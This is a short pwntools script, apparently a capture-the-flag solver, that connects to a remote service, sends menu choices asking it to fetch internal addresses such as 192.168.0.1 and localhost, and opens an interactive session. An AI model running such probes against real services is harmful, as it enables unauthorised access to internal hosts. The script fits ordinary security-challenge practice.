from pwn import *

if __name__ == "__main__":
    r = None
    r = remote(sys.argv[2], int(sys.argv[1]))
    r.sendline(b'g')
    r.sendline(b'192.168.0.1/10000')
    r.sendline(b'g')
    r.sendline(b'localhost/10000')
    sleep(0.01)
    r.sendline(b'v')
    r.interactive()
    r.close()